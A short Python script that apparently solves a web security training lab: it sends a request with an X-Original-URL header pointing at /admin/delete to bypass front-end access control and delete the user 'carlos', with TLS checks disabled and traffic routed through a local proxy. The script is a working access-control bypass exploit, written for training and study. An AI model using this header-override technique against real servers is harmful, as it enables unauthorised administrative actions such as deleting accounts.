#####################
#    Libraries      #
#####################
import requests
import sys
import urllib3
import argparse

#####################
#    Variables      #
#####################

## Disable requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


## Setup Proxies for future debugs
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

parser = argparse.ArgumentParser(prog=f'\n[+] WebAcademy Access Control: Lab 2'
                                ,description="Description: Accesses the Admin Panel that has and unpredictable location\n and Delete Carlos' user"
                                ,epilog='----------------------- END ---------------------------')
parser.add_argument('-u', metavar ='--url', action='store', dest='url', type=str, required=True, help="Target's URL")
args = parser.parse_args()


#####################
#    Functions      #
#####################

def delete_user(url,s):
    print("[+] Accessing the admin panel and deleting Carlos' user")
    delete_carlos_user_url = "/admin/delete"
    headers = {"x-original-url":delete_carlos_user_url}
    data = {"username":"carlos"}
    r = s.get(url, verify=False, params=data, headers=headers, proxies=proxies)
    print(r.text)
    if r.status_code == 200:
        print('[+] Successfully deleted Carlos\' user.')
    else:
        print('[-] Failed to delete Carlos user.')
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 3:
        print(f"[+] Usage: {sys.argv[0]} -u <lab's url>")
        print(f"[+] Example: {sys.argv[0]} -u www.example.com")
        sys.exit(-1)

    url = args.url.rstrip('/')
    s = requests.Session()
    delete_user(url,s)


if __name__ == "__main__":
    main()